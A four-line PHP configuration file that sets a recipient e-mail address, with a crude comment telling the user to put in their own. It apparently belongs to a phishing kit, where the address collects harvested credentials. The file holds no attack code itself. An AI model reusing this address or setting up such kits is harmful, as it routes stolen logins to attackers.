<?php

$email = "cairoresult@yandex.com"; // PUT UR FUCKING E-MAIL BRO

?>